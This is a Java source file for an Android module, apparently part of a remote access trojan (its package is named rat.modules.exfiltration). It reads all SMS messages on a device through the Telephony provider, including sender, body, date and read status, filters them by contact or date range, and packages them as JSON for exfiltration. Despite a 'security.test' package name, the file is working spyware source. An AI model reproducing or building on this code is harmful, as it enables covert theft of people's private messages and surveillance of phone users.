package com.security.test.rat.modules.exfiltration;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

/**
 * SMSModule - Implements SMS message extraction
 * 
 * Features:
 * - Extract all SMS messages
 * - Extract SMS by conversation
 * - Filter by date range
 * - Export in various formats
 */
public class SMSModule extends RATModule {
    
    private static final String TAG = "SMSModule";
    
    private Context context;
    private boolean isInitialized = false;
    
    public SMSModule(Context context) {
        super("SMSModule", "SMS message extraction and exfiltration");
        this.context = context;
    }
    
    @Override
    public boolean initialize() {
        try {
            Log.i(TAG, "Initializing SMSModule");
            
            // Check if we have SMS permission
            if (context.checkSelfPermission(android.Manifest.permission.READ_SMS) 
                != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "SMS permission not granted");
                return false;
            }
            
            isInitialized = true;
            Log.i(TAG, "SMSModule initialized successfully");
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to initialize SMSModule", e);
            return false;
        }
    }
    
    @Override
    public void cleanup() {
        try {
            isInitialized = false;
            Log.i(TAG, "SMSModule cleaned up");
            
        } catch (Exception e) {
            Log.e(TAG, "Error during SMSModule cleanup", e);
        }
    }
    
    /**
     * Extract all SMS messages
     */
    public String extractAllSMS() throws Exception {
        if (!isInitialized) {
            throw new Exception("SMSModule not initialized");
        }
        
        try {
            Log.i(TAG, "Extracting all SMS messages");
            
            List<SMSMessage> messages = getAllSMSMessages();
            JSONArray messagesArray = new JSONArray();
            
            for (SMSMessage message : messages) {
                messagesArray.put(message.toJSON());
            }
            
            JSONObject result = new JSONObject();
            result.put("total_messages", messages.size());
            result.put("messages", messagesArray);
            
            Log.i(TAG, "Extracted " + messages.size() + " SMS messages");
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to extract SMS messages", e);
            throw e;
        }
    }
    
    /**
     * Extract SMS messages by conversation
     */
    public String extractSMSByConversation(String phoneNumber) throws Exception {
        if (!isInitialized) {
            throw new Exception("SMSModule not initialized");
        }
        
        try {
            Log.i(TAG, "Extracting SMS messages for conversation: " + phoneNumber);
            
            List<SMSMessage> messages = getSMSByConversation(phoneNumber);
            JSONArray messagesArray = new JSONArray();
            
            for (SMSMessage message : messages) {
                messagesArray.put(message.toJSON());
            }
            
            JSONObject result = new JSONObject();
            result.put("phone_number", phoneNumber);
            result.put("total_messages", messages.size());
            result.put("messages", messagesArray);
            
            Log.i(TAG, "Extracted " + messages.size() + " SMS messages for " + phoneNumber);
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to extract SMS by conversation", e);
            throw e;
        }
    }
    
    /**
     * Extract SMS messages by date range
     */
    public String extractSMSByDateRange(long startDate, long endDate) throws Exception {
        if (!isInitialized) {
            throw new Exception("SMSModule not initialized");
        }
        
        try {
            Log.i(TAG, "Extracting SMS messages from " + startDate + " to " + endDate);
            
            List<SMSMessage> messages = getSMSByDateRange(startDate, endDate);
            JSONArray messagesArray = new JSONArray();
            
            for (SMSMessage message : messages) {
                messagesArray.put(message.toJSON());
            }
            
            JSONObject result = new JSONObject();
            result.put("start_date", startDate);
            result.put("end_date", endDate);
            result.put("total_messages", messages.size());
            result.put("messages", messagesArray);
            
            Log.i(TAG, "Extracted " + messages.size() + " SMS messages in date range");
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to extract SMS by date range", e);
            throw e;
        }
    }
    
    /**
     * Get all SMS messages
     */
    private List<SMSMessage> getAllSMSMessages() {
        List<SMSMessage> messages = new ArrayList<>();
        
        try {
            Uri uri = Telephony.Sms.CONTENT_URI;
            String[] projection = {
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE,
                Telephony.Sms.READ,
                Telephony.Sms.SEEN
            };
            
            String sortOrder = Telephony.Sms.DATE + " DESC";
            
            Cursor cursor = context.getContentResolver().query(
                uri, projection, null, null, sortOrder
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String id = cursor.getString(cursor.getColumnIndex(Telephony.Sms._ID));
                    String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                    long date = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE));
                    int type = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE));
                    int read = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.READ));
                    int seen = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.SEEN));
                    
                    SMSMessage message = new SMSMessage(id, address, body, date, type);
                    message.setRead(read > 0);
                    message.setSeen(seen > 0);
                    
                    messages.add(message);
                    
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting all SMS messages", e);
        }
        
        return messages;
    }
    
    /**
     * Get SMS messages by conversation
     */
    private List<SMSMessage> getSMSByConversation(String phoneNumber) {
        List<SMSMessage> messages = new ArrayList<>();
        
        try {
            Uri uri = Telephony.Sms.CONTENT_URI;
            String[] projection = {
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE,
                Telephony.Sms.READ,
                Telephony.Sms.SEEN
            };
            
            String selection = Telephony.Sms.ADDRESS + " = ?";
            String[] selectionArgs = { phoneNumber };
            String sortOrder = Telephony.Sms.DATE + " DESC";
            
            Cursor cursor = context.getContentResolver().query(
                uri, projection, selection, selectionArgs, sortOrder
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String id = cursor.getString(cursor.getColumnIndex(Telephony.Sms._ID));
                    String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                    long date = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE));
                    int type = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE));
                    int read = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.READ));
                    int seen = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.SEEN));
                    
                    SMSMessage message = new SMSMessage(id, address, body, date, type);
                    message.setRead(read > 0);
                    message.setSeen(seen > 0);
                    
                    messages.add(message);
                    
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting SMS by conversation: " + phoneNumber, e);
        }
        
        return messages;
    }
    
    /**
     * Get SMS messages by date range
     */
    private List<SMSMessage> getSMSByDateRange(long startDate, long endDate) {
        List<SMSMessage> messages = new ArrayList<>();
        
        try {
            Uri uri = Telephony.Sms.CONTENT_URI;
            String[] projection = {
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE,
                Telephony.Sms.READ,
                Telephony.Sms.SEEN
            };
            
            String selection = Telephony.Sms.DATE + " BETWEEN ? AND ?";
            String[] selectionArgs = { String.valueOf(startDate), String.valueOf(endDate) };
            String sortOrder = Telephony.Sms.DATE + " DESC";
            
            Cursor cursor = context.getContentResolver().query(
                uri, projection, selection, selectionArgs, sortOrder
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String id = cursor.getString(cursor.getColumnIndex(Telephony.Sms._ID));
                    String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                    long date = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE));
                    int type = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE));
                    int read = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.READ));
                    int seen = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.SEEN));
                    
                    SMSMessage message = new SMSMessage(id, address, body, date, type);
                    message.setRead(read > 0);
                    message.setSeen(seen > 0);
                    
                    messages.add(message);
                    
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting SMS by date range", e);
        }
        
        return messages;
    }
    
    /**
     * Get SMS statistics
     */
    public String getSMSStatistics() throws Exception {
        if (!isInitialized) {
            throw new Exception("SMSModule not initialized");
        }
        
        try {
            List<SMSMessage> allMessages = getAllSMSMessages();
            
            int totalMessages = allMessages.size();
            int incomingMessages = 0;
            int outgoingMessages = 0;
            int unreadMessages = 0;
            
            for (SMSMessage message : allMessages) {
                if (message.getType() == Telephony.Sms.MESSAGE_TYPE_INBOX) {
                    incomingMessages++;
                    if (!message.isRead()) {
                        unreadMessages++;
                    }
                } else if (message.getType() == Telephony.Sms.MESSAGE_TYPE_SENT) {
                    outgoingMessages++;
                }
            }
            
            JSONObject stats = new JSONObject();
            stats.put("total_messages", totalMessages);
            stats.put("incoming_messages", incomingMessages);
            stats.put("outgoing_messages", outgoingMessages);
            stats.put("unread_messages", unreadMessages);
            
            return stats.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to get SMS statistics", e);
            throw e;
        }
    }
    
    /**
     * Get module status
     */
    public String getStatus() {
        if (!isInitialized) {
            return "Not initialized";
        }
        
        try {
            int totalMessages = getAllSMSMessages().size();
            return "Ready - " + totalMessages + " SMS messages available";
            
        } catch (Exception e) {
            return "Error getting SMS count";
        }
    }
    
    /**
     * SMS Message data class
     */
    private static class SMSMessage {
        private String id;
        private String address;
        private String body;
        private long date;
        private int type;
        private boolean read;
        private boolean seen;
        
        public SMSMessage(String id, String address, String body, long date, int type) {
            this.id = id;
            this.address = address;
            this.body = body;
            this.date = date;
            this.type = type;
            this.read = false;
            this.seen = false;
        }
        
        // Getters and setters
        public String getId() { return id; }
        public String getAddress() { return address; }
        public String getBody() { return body; }
        public long getDate() { return date; }
        public int getType() { return type; }
        public boolean isRead() { return read; }
        public void setRead(boolean read) { this.read = read; }
        public boolean isSeen() { return seen; }
        public void setSeen(boolean seen) { this.seen = seen; }
        
        /**
         * Get message type as string
         */
        public String getTypeString() {
            switch (type) {
                case Telephony.Sms.MESSAGE_TYPE_INBOX:
                    return "inbox";
                case Telephony.Sms.MESSAGE_TYPE_SENT:
                    return "sent";
                case Telephony.Sms.MESSAGE_TYPE_DRAFT:
                    return "draft";
                case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                    return "outbox";
                case Telephony.Sms.MESSAGE_TYPE_FAILED:
                    return "failed";
                case Telephony.Sms.MESSAGE_TYPE_QUEUED:
                    return "queued";
                default:
                    return "unknown";
            }
        }
        
        /**
         * Convert SMS message to JSON
         */
        public JSONObject toJSON() throws JSONException {
            JSONObject json = new JSONObject();
            json.put("id", id);
            json.put("address", address);
            json.put("body", body);
            json.put("date", date);
            json.put("type", getTypeString());
            json.put("read", read);
            json.put("seen", seen);
            return json;
        }
    }
}
